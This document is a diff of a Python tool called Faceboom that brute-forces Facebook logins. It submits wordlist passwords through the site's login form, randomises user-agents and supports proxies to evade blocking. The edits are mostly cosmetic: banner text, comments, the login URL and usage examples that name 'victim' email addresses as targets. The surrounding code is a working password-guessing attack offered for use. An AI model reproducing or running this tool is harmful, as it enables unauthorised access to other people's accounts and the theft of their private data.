@@ -26,13 +26,13 @@ os.system("cls||clear")
 
 # Colors
 
-wi="\033[1;37m" #>>White#
-rd="\033[1;31m" #>Red   #
-gr="\033[1;32m" #>Green #
-yl="\033[1;33m" #>Yallow#
+wi="\033[1;37m" 
+rd="\033[1;31m" 
+gr="\033[1;32m" 
+yl="\033[1;33m" 
 
 
-# checking internet Connection
+# Hosting Secure Connection
 
 def cnet():                                       
    try:                                           
@@ -56,7 +56,7 @@ def cpro(ip,port=None):
   except Exception : return False
 
   
-# Choice Random User-Agent
+# Choice Random User-Agent supporting browser
 
 def useragent():
     useragents = [
@@ -83,7 +83,7 @@ def ID(url):
         exit(1)
 
         
-# Faceboom Brute Force Function and Performance
+# Brute Force Main Frame
 
 def FBOM(username, wordlist, proxy=None,passwd=None):
     if passwd==None:
@@ -137,19 +137,19 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
     prox = gr+useproxy.split(":")[0]+wi+":"+yl+useproxy.split(":")[1] if useproxy !=False else ""
     proxystatus = prox+wi+"["+gr+"ON"+wi+"]" if useproxy !=False else yl+"["+rd+"OFF"+yl+"]"
     print(gr+"""
-==================================
+----------------------------------
 [---]        """+wi+"""Faceboom"""+gr+"""         [---]
-==================================
-[---]  """+wi+"""Bruteforcing Facebook  """+gr+""" [---]
-==================================
+----------------------------------
+[---]  """+wi+"""Brute Forcing Facebook  """+gr+""" [---]
+----------------------------------
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
-==================================
+----------------------------------
 [>] Target      :> """+wi+username+gr+"""
 {}""".format("[>] Wordlist    :> "+yl+str(wordlist) if passwd==None else "[>] Password    :> "+yl+str(passwd))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+gr+"""      
-=================================="""+wi+"""
-[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
-==================================
+----------------------------------"""+wi+"""
+[~] """+yl+"""Brute"""+rd+""" Force Attack: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
+----------------------------------
 """)
     loop = 1
     br=mechanize.Browser()
@@ -164,7 +164,7 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
           passwd = passwd.strip()
           try:
             print(wi+"["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
-            br.open("https://facebook.com")
+            br.open("https://www.facebook.com")
             br.select_form(nr=0)
             br.form["email"]=username
             br.form["pass"]=passwd
@@ -187,7 +187,7 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
 
           if issuccess==0:
             print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
-            print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Other password or Wordlist File "+gr+":)"+wi)          
+            print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try other password or Wordlist File "+gr+":)"+wi)          
           exit(1)
     with open(wordlist) as wfile:
       for passwd in wfile:
@@ -243,9 +243,9 @@ Examples:
      |--------
      | python faceboom.py -t victim@gmail.com -w wlist.txt
      |--------
-     | python Faceboom.py -t 100001013078780 -w wlist.txt
+     | python Faceboom.py -t 40000057893246323 -w wlist.txt
      |--------
-     | python faceboom.py -t victim@hotmail.com -w wlist.txt -p 165.227.35.11 default(port=8080,80) 
+     | python faceboom.py -t victim@gmail.com -w wlist.txt -p 165.227.35.11 default(port=8080,80) 
      |--------
      | python faceboom.py -t victim@gmail.com -s 1234567
      |-------- 
